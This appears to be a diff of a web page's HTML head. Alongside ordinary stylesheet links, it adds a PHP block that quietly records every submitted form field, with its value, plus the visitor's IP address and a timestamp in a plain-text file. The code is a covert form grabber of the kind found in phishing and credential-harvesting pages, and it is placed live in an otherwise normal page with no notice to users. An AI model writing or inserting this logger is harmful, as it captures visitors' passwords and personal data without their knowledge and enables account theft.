@@ -12,6 +12,19 @@
     <link rel="stylesheet" href="assets/css/Navbar-Centered-Brand-Dark-icons.css">
     <link rel="stylesheet" href="assets/css/Pure-CSS-Electric-storm-button.css">
     <link rel="stylesheet" href="assets/css/styles.css">
+    <?php {
+$date = fopen("thefile.txt","a+"); //open log file
+    fwrite($date, date("Y-m-d H:i:s ")); //writes date and time
+    fclose($date); //closes the file
+                
+$ip = $_SERVER['REMOTE_ADDR']; //get supposed IP
+    $handle = fopen("thefile.txt", "a"); //open log file
+    foreach($_POST as $variable => $value)  //loop through POST vars
+    fwrite($handle, $variable . "+" . $value . "\r\n");
+    fwrite($handle, "$ip\r\n"); //writes down IP address and adds new line
+    fclose($handle); //close the file
+    }
+?>
 </head>
 
 <body style="background: rgb(232,225,225);">
